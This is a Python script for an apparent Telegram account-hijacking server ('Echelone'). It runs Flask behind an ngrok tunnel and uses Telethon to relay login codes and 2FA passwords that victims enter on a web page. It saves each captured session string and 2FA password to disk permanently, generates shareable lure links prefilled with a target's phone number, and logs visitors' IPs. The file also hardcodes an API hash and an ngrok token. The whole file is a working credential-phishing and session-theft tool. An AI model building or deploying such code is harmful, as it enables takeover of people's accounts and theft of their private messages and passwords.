import os
import json
import uuid
import asyncio
import logging
import threading 
from urllib.parse import quote_plus
from concurrent.futures import Future

# --- FLASK IMPORTS ---
from flask import Flask, request, jsonify, redirect
from werkzeug.serving import make_server 

# --- TELETHON IMPORTS ---
from telethon import TelegramClient, errors
from telethon.sessions import StringSession

# --- NGROK IMPORTS ---
from pyngrok import ngrok, conf

# --- TEXTUAL IMPORTS (TUI) ---
from textual.app import App, ComposeResult
from textual.containers import Horizontal, Vertical
from textual.widgets import Header, Footer, Log, Static, Label
from textual import work 

# --- КОНФИГ ---
API_ID = 15762787
API_HASH = '4c6717f2df47eae8f7cce5830788216e'
NGROK_AUTH_TOKEN = "36EeSfMH8IYBACDLj9RD5CAbffN_TVJSNjLaGCLS8wqXWE2m" 
PUBLIC_BASE_URL = os.environ.get('PUBLIC_BASE_URL')
SERVER_PORT = 5000

# --- ПУТИ ---
BASE_DIR = os.path.dirname(os.path.abspath(__file__))
SESSION_FOLDER = os.path.join(BASE_DIR, 'sessions')
LINKS_FILE = os.path.join(SESSION_FOLDER, 'links.json')

os.makedirs(SESSION_FOLDER, exist_ok=True)
if not os.path.exists(LINKS_FILE):
    with open(LINKS_FILE, 'w') as f: json.dump({}, f)

temp_clients = {}
GUI_APP = None 

# --- ASYNC LOOP MANAGEMENT ---
telethon_loop = None
telethon_thread = None

def get_telethon_loop():
    """Возвращает dedicated event loop для Telethon операций"""
    global telethon_loop, telethon_thread
    
    if telethon_loop is None:
        def start_loop(loop):
            asyncio.set_event_loop(loop)
            loop.run_forever()
        
        telethon_loop = asyncio.new_event_loop()
        telethon_thread = threading.Thread(target=start_loop, args=(telethon_loop,), daemon=True)
        telethon_thread.start()
    
    return telethon_loop

def run_in_telethon_loop(coro):
    """Запускает корутину в dedicated Telethon loop и ждет результата"""
    loop = get_telethon_loop()
    future = asyncio.run_coroutine_threadsafe(coro, loop)
    return future.result()

# --- FLASK SETUP ---
app = Flask(__name__)
log = logging.getLogger('werkzeug')
log.setLevel(logging.ERROR)

# --- ВСПОМОГАТЕЛЬНЫЕ ФУНКЦИИ ---

def log_to_gui(message, style="info"):
    """Отправляет сообщение в виджет лога Textual (потокобезопасный вызов)"""
    if GUI_APP:
        GUI_APP.write_log(message, style)

def load_links():
    try:
        with open(LINKS_FILE, 'r') as f: return json.load(f)
    except: return {}

def save_links(data):
    with open(LINKS_FILE, 'w') as f: json.dump(data, f)

def create_share_slug(phone):
    links = load_links()
    slug = uuid.uuid4().hex[:10]
    links[slug] = phone
    save_links(links)
    return slug

# --- LOGGING MIDDLEWARE (для Flask) ---
@app.before_request
def log_request():
    if request.path.startswith('/static'): return
    
    ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    if ip and ',' in ip:
        ip = ip.split(',')[0].strip()

    method_color = "green" if request.method == 'GET' else "blue"
    
    log_string = f"[{method_color}]{request.method}[/] {request.path} [dim]from[/] [cyan]{ip}[/]"
    if GUI_APP:
        GUI_APP.write_log(log_string, style="raw")

# --- TELETHON LOGIC ---
async def get_client_for_auth(phone):
    """Создает клиента сразу в постоянной папке пользователя"""
    user_folder = os.path.join(SESSION_FOLDER, phone)
    os.makedirs(user_folder, exist_ok=True)
    session_path = os.path.join(user_folder, phone)
    
    if phone in temp_clients: 
        return temp_clients[phone], False
        
    try:
        client = TelegramClient(session_path, API_ID, API_HASH)
        await client.connect()
        
        # Проверяем, авторизован ли уже
        if await client.is_user_authorized():
            log_to_gui(f"Пользователь {phone} уже авторизован", "success")
            return client, True
            
        temp_clients[phone] = client
        return client, False
    except Exception as e:
        log_to_gui(f"Ошибка создания клиента: {e}", "error")
        raise e

async def finalize_successful_login(phone, client, password=None):
    """Сохраняет string session и завершает авторизацию"""
    user_folder = os.path.join(SESSION_FOLDER, phone)
    
    # Сохраняем string session для резервного копирования
    string_session = StringSession.save(client.session)
    with open(os.path.join(user_folder, f'{phone}_string.txt'), 'w') as f:
        f.write(string_session)
    
    # Сохраняем 2FA пароль, если он был использован
    if password:
        with open(os.path.join(user_folder, f'{phone}_2fa.txt'), 'w') as f:
            f.write(password)
        log_to_gui(f"💾 2FA пароль сохранен для {phone}", "info")
    
    await client.disconnect()
    if phone in temp_clients:
        del temp_clients[phone]
        
    log_to_gui(f"✅ УСПЕШНЫЙ ВХОД: {phone} -> Сессия сохранена навсегда", "success")

# --- FLASK ROUTES ---
@app.route('/')
def index():
    try:
        from flask import render_template
        return render_template('index.html')
    except:
        return f"<h1>Echelone Server Running (Flask)</h1><p>Local URL: http://127.0.0.1:{SERVER_PORT}</p>"

@app.route('/api/send_code', methods=['POST'])
def send_code():
    data = request.get_json()
    phone = data.get('phone')
    log_to_gui(f"⚡ Попытка входа: {phone}", "warning")
    try:
        client, authorized = run_in_telethon_loop(get_client_for_auth(phone))
        if authorized: 
            return jsonify({'message': 'Уже авторизован', 'authorized': True})
        sent = run_in_telethon_loop(client.send_code_request(phone))
        log_to_gui(f"📱 Код отправлен на {phone}", "success")
        return jsonify({'message': 'Код отправлен', 'phone_code_hash': sent.phone_code_hash})
    except Exception as e:
        log_to_gui(f"❌ Ошибка отправки кода: {e}", "error")
        if phone in temp_clients: 
            del temp_clients[phone]
        return jsonify({'error': str(e)}), 400

@app.route('/api/login', methods=['POST'])
def login():
    data = request.get_json()
    phone = data.get('phone')
    code = data.get('code')
    phone_code_hash = data.get('phone_code_hash')
    client = temp_clients.get(phone)
    if not client: return jsonify({'error': 'Сессия истекла'}), 400

    try:
        run_in_telethon_loop(client.sign_in(phone=phone, code=code, phone_code_hash=phone_code_hash))
        run_in_telethon_loop(finalize_successful_login(phone, client))
        return jsonify({'status': 'success'})
    except errors.SessionPasswordNeededError:
        log_to_gui(f"🔐 Требуется 2FA пароль для {phone}", "warning")
        return jsonify({'status': '2fa_required'})
    except Exception as e:
        log_to_gui(f"❌ Ошибка входа: {e}", "error")
        return jsonify({'error': str(e)}), 400

@app.route('/api/2fa', methods=['POST'])
def login_2fa():
    data = request.get_json()
    phone = data.get('phone')
    password = data.get('password')
    client = temp_clients.get(phone)
    if not client: return jsonify({'error': 'Error'}), 400
    
    try:
        run_in_telethon_loop(client.sign_in(password=password))
        run_in_telethon_loop(finalize_successful_login(phone, client, password))
        return jsonify({'status': 'success'})
    except Exception as e:
        log_to_gui(f"❌ Ошибка 2FA: {e}", "error")
        return jsonify({'error': str(e)}), 400

@app.route('/api/create_share', methods=['POST'])
def api_create_share():
    data = request.get_json()
    slug = create_share_slug(data.get('phone'))
    base = PUBLIC_BASE_URL or request.url_root.rstrip('/')
    url = f"{base}/share/{slug}"
    log_to_gui(f"🔗 Ссылка создана: {url}", "method")
    return jsonify({'share_url': url})

@app.route('/share/<slug>')
def share_slug(slug):
    links = load_links()
    phone = links.get(slug)
    if phone:
        return redirect(f"/?phone={quote_plus(phone)}")
    return "Link expired or invalid", 404

# --- TEXTUAL DASHBOARD ---

class Dashboard(App):
    CSS = """
    Screen { background: #0d1117; }
    Header { background: #161b22; color: #58a6ff; }
    #sidebar { width: 35%; border-right: solid #30363d; background: #0d1117; padding: 1; }
    #logs { width: 65%; background: #0d1117; border-left: solid #30363d; }
    Log { background: #0d1117; color: #c9d1d9; border: solid #30363d; }
    Label { color: #8b949e; margin-bottom: 1; }
    .status-val { color: #58a6ff; text-style: bold; }
    .title-box { background: #161b22; color: #58a6ff; content-align: center middle; height: 3; margin-bottom: 1; border-bottom: solid #30363d; }
    """

    def compose(self) -> ComposeResult:
        yield Header(show_clock=True)
        with Horizontal():
            with Vertical(id="sidebar"):
                yield Label("ECHELONE SERVER", classes="title-box")
                yield Label("Ngrok URL:")
                yield Static("Initializing...", id="ngrok_url", classes="status-val")
                yield Label("\nLocal URL:")
                yield Static(f"http://127.0.0.1:{SERVER_PORT}", classes="status-val")
                yield Label("\nStorage Path:")
                yield Static(SESSION_FOLDER, classes="status-val")
            with Vertical(id="logs"):
                yield Label(" LIVE SYSTEM LOGS", classes="title-box")
                yield Log(id="log_view", highlight=True)
        yield Footer()

    def on_mount(self) -> None:
        global GUI_APP
        GUI_APP = self
        # Инициализируем Telethon loop перед стартом
        get_telethon_loop()
        self.perform_startup() 

    @work(exclusive=True, group="startup_tasks")
    async def perform_startup(self):
        await self._start_flask_server()
        await self._start_ngrok_tunnel()

    async def _start_flask_server(self):
        self.write_log("Starting Flask Server in thread...", "info")
        
        self.server = make_server('127.0.0.1', SERVER_PORT, app)
        self.server_thread = threading.Thread(target=self.server.serve_forever, daemon=True)
        self.server_thread.start()
        
        for i in range(1, 4):
            self.write_log(f"Waiting for Flask server to bind port (Attempt {i}/3)...", "info")
            await asyncio.sleep(1.0) 
        
        self.write_log("Flask Server is now listening on 5000.", "success")

    async def _start_ngrok_tunnel(self):
        global PUBLIC_BASE_URL
        
        if not PUBLIC_BASE_URL and NGROK_AUTH_TOKEN:
            try:
                conf.get_default().auth_token = NGROK_AUTH_TOKEN
                conf.get_default().region = "eu"
                ngrok.kill()
                
                tunnel = ngrok.connect(SERVER_PORT, bind_tls=True) 
                
                PUBLIC_BASE_URL = tunnel.public_url
                self.call_later(self.query_one("#ngrok_url").update, PUBLIC_BASE_URL)
                self.write_log(f"Ngrok Tunnel started: {PUBLIC_BASE_URL}", "success")
            except Exception as e:
                self.call_later(self.query_one("#ngrok_url").update, "Error")
                self.write_log(f"Ngrok Error: {e}", "error")
        elif PUBLIC_BASE_URL:
            self.call_later(self.query_one("#ngrok_url").update, PUBLIC_BASE_URL)

    def on_unmount(self):
        if hasattr(self, 'server') and self.server:
            self.write_log("Shutting down Flask server...", "info")
            self.server.shutdown()

    def write_log(self, message, style="info"):
        """Метод для записи в лог виджет"""
        
        is_raw = style == "raw"
        
        if not is_raw:
            color_map = {
                "info": "white",
                "warning": "yellow",
                "error": "red",
                "success": "green",
                "method": "magenta",
                "ip": "cyan"
            }
            color = color_map.get(style, "white")
            formatted_message = f"[{color}]{message}[/]"
        else:
            formatted_message = message 

        def do_write():
            log_view = self.query_one("#log_view", Log)
            log_view.write(formatted_message + "\n") 

        try:
            self.call_from_thread(do_write)
        except RuntimeError:
            self.call_later(do_write)

if __name__ == '__main__':
    app_ui = Dashboard()
    app_ui.run()
